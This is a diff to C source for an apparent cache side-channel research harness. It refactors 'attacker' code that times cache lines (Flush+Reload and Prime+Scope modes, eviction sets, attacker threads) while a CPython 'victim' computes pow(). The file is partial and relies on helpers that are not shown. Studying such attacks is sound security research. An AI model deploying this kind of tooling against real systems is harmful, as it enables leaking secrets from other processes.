@@ -14,22 +14,39 @@
 #include "shared_memory.h"
 
 #define CACHE_LINE_COUNT (3)
-#define PROFILE_ITERATIONS (1 << 16)
-
-#define USE_FF (0)
-#define USE_PS (1)
+#define PROFILE_ITERATIONS (1 << 15)
 
 CPYTHON_TARGET_CACHELINE(DECLARE_CACHE_LINE);
 sync_ctx_t sync_ctx;
 uint64_t victim_runs = 1;
 
-#if USE_FF
-static const uint64_t waiting_time = 80000;
+static uint64_t tsc_buffer[CACHE_LINE_COUNT * PROFILE_ITERATIONS];
+static uint64_t lat_buffer[CACHE_LINE_COUNT * PROFILE_ITERATIONS];
 
-uint64_t sample_tsc[PROFILE_ITERATIONS][CACHE_LINE_COUNT];
-uint64_t reload_time[PROFILE_ITERATIONS][CACHE_LINE_COUNT];
+static double cz_freq = 18.46, aw_freq = 18.18, at_freq = 18.18,
+              at_side_freq = 21.33;
+
+/* PS-mode pointer arrays, assigned at the start of PS_profile_pow(). */
+static uint64_t *sample_tsc[CACHE_LINE_COUNT];
+static uint64_t *probe_time[CACHE_LINE_COUNT];
+static uint64_t *reload_time[CACHE_LINE_COUNT];
+
+enum {
+	cache_line_count = CACHE_LINE_COUNT,
+	profile_iterations = PROFILE_ITERATIONS
+};
+static const uint64_t max_exec_cycles = (uint64_t)3e9;
+static const char *test_name = "cpython_pow";
+static pthread_barrier_t attacker_threads_barrier;
 
 void FF_profile_pow() {
+	static const uint64_t waiting_time = 80000;
+
+	for (int i = 0; i < CACHE_LINE_COUNT; ++i) {
+		sample_tsc[i] = tsc_buffer + i * PROFILE_ITERATIONS;
+		reload_time[i] = lat_buffer + i * PROFILE_ITERATIONS;
+	}
+
 	init_sync_ctx(CPYTHON_PROJ_ID);
 
 	log_info("Wait for victim initialization");
@@ -38,17 +55,8 @@ void FF_profile_pow() {
 
 	CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET)
 
-	create_directory("output");
-
-	for (int i = 0; i < victim_runs; ++i) {
+	for (int i = 0; i < (int)victim_runs; ++i) {
 		log_info("Attacker Iteration %d", i);
-		char output_file[32];
-		sprintf(output_file, "output/%d.out", i);
-		FILE *fp = fopen(output_file, "w");
-		if (fp == NULL) {
-			log_error("Error opening output_file %s", output_file);
-			exit(1);
-		}
 
 		int index = 0;
 		sync_ctx_set_action(SYNC_CTX_START);
@@ -74,36 +82,21 @@ void FF_profile_pow() {
 
 		pthread_barrier_wait(sync_ctx.barrier);
 
-		for (int p = 0; p < index; ++p) {
-			for (int c = 0; c < CACHE_LINE_COUNT; ++c) {
-				fprintf(fp, "%lu:%lu ", sample_tsc[p][c], reload_time[p][c]);
-			}
-			fprintf(fp, "\n");
-		}
-		fclose(fp);
+		dump_profiling_traces(test_name,
+		                      victim_runs,
+		                      sample_tsc,
+		                      reload_time,
+		                      CACHE_LINE_COUNT,
+		                      index,
+		                      index == 0);
 
-		memset(sample_tsc,
-		       0,
-		       PROFILE_ITERATIONS * CACHE_LINE_COUNT * sizeof(uint64_t));
-		memset(reload_time,
-		       0,
-		       PROFILE_ITERATIONS * CACHE_LINE_COUNT * sizeof(uint64_t));
+		memset(tsc_buffer, 0, sizeof(tsc_buffer));
+		memset(lat_buffer, 0, sizeof(lat_buffer));
 	}
 
 	sync_ctx_set_action(SYNC_CTX_EXIT);
 	pthread_barrier_wait(sync_ctx.barrier);
 }
-
-#elif USE_PS
-
-enum { cache_line_count = 3, profile_samples = 1 << 15 };
-static const uint64_t max_exec_cycles = (uint64_t)3e9;
-static uint64_t probe_time_arr[cache_line_count][profile_samples];
-static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
-static uint64_t *sample_tsc[cache_line_count];
-static uint64_t *probe_time[cache_line_count];
-static pthread_barrier_t attacker_threads_barrier;
-static const char *test_name = "cpython_pow";
 
 void PS_profile_pow() {
 	PS_attacker_thread_config_t pt_consume_zero, pt_absorb_window,
@@ -123,9 +116,9 @@ void PS_profile_pow() {
 		return;
 	}
 
-	for (int i = 0; i < cache_line_count; ++i) {
-		sample_tsc[i] = sample_tsc_arr[i];
-		probe_time[i] = probe_time_arr[i];
+	for (int i = 0; i < CACHE_LINE_COUNT; ++i) {
+		sample_tsc[i] = tsc_buffer + i * PROFILE_ITERATIONS;
+		probe_time[i] = lat_buffer + i * PROFILE_ITERATIONS;
 	}
 
 	PS_thread_config_init(pt_consume_zero);
@@ -150,12 +143,12 @@ void PS_profile_pow() {
 	pt_absorb_trailing.pin_cpu = -1;
 	pt_absorb_trailing.target =
 	    (uint8_t *)((uintptr_t)target_absorb_trailing + 2 * CACHE_LINE_SIZE);
-	pt_absorb_trailing.evset =
-	    prepare_evset(pt_absorb_trailing.target, &hctrl);
+	pt_absorb_trailing.evset = prepare_evset(pt_absorb_trailing.target, &hctrl);
 
 	stop_helper_thread(&hctrl);
 
-	if (pthread_barrier_init(&attacker_threads_barrier, NULL, 3) != 0) {
+	if (pthread_barrier_init(
+	        &attacker_threads_barrier, NULL, CACHE_LINE_COUNT) != 0) {
 		log_error("Error initializing barrier\n");
 		return;
 	}
@@ -174,28 +167,44 @@ void PS_profile_pow() {
 	sync_ctx_set_action(SYNC_CTX_EXIT);
 	pthread_barrier_wait(sync_ctx.barrier);
 }
-#endif
 
 int main(int argc, char **argv) {
-	/* pin_cpu(pinned_cpu0); */
+	int use_ff = 0, use_ps = 0;
 
-	if (argc > 1) {
-		char *endptr = NULL;
-		errno = 0;
-		const uint64_t value = strtoull(argv[1], &endptr, 10);
-		if (errno == 0 && endptr != argv[1] && *endptr == '\0') {
-			victim_runs = value;
+	for (int i = 1; i < argc; ++i) {
+		if (strcmp(argv[i], "-FR") == 0) {
+			use_ff = 1;
+		} else if (strcmp(argv[i], "-PS") == 0) {
+			use_ps = 1;
+		} else {
+			char *endptr = NULL;
+			errno = 0;
+			const uint64_t value = strtoull(argv[i], &endptr, 10);
+			if (errno == 0 && endptr != argv[i] && *endptr == '\0') {
+				victim_runs = value;
+			}
 		}
+	}
+
+	if (!use_ff && !use_ps) {
+		log_error("Usage: %s [-FR | -PS] [iterations]", argv[0]);
+		exit(1);
+	}
+
+	if (use_ff && use_ps) {
+		log_error("Cannot specify both -FR and -PS");
+		exit(1);
 	}
 
 	if (victim_runs == 0) {
 		log_error("python iterations has to be non-zero");
 		exit(1);
 	}
-#if USE_FF
-	FF_profile_pow();
-#elif USE_PS
-	PS_profile_pow();
-#endif
+
+	if (use_ff)
+		FF_profile_pow();
+	else
+		PS_profile_pow();
+
 	return 0;
 }
